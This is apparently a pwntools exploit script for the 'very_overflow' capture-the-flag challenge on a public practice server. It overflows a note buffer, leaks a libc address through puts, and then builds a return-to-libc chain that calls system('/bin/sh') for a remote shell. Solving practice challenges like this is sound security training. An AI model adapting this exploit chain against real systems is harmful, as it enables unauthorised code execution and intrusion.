from pwn import *
from LibcSearcher import LibcSearcher
import string
context.binary = './very_overflow'
#context.log_level = 'debug'
context.timeout = 10000
elf = context.binary

libc = context.binary.libc
def dbg():
	raw_input()


if args['REMOTE']:
	p = remote('hackme.inndy.tw', 7705)
else:
	p = process('./very_overflow')

def menu(ch):
	p.recvuntil('Your action: ')
	p.sendline(str(ch))

def add(content):
	menu(1)
	p.sendlineafter('note: ', content)

def edit(idx, content):
	menu(2)
	p.sendlineafter('edit: ', str(idx))
	p.sendlineafter('data: ', content)


def sendpayload(payload):
	for i in range(0x80):
		add('a'*0x80)
	add(payload)
	menu(5)



puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
vuln = 0x8048853

payload = p32(0xdeadbeef)*3
payload += p32(puts_plt) + p32(vuln) + p32(puts_got)

sendpayload(payload)
puts_addr = u32(p.recv(4))
print "puts_addr ==> " + hex(puts_addr)

libc = LibcSearcher('puts', puts_addr)
libc_base = puts_addr - libc.dump('puts')
libc.address = puts_addr - libc.dump('puts')
system = libc.dump('system') + libc_base
binsh = libc.dump('str_bin_sh') + libc_base

p.recvline()


payload = p32(0xdeadbeef)*3 + p32(system) + p32(vuln) + p32(binsh)
sendpayload(payload)

#gdb.attach(p, 'b* 0x80488F1')
#dbg()

p.interactive()
p.close()

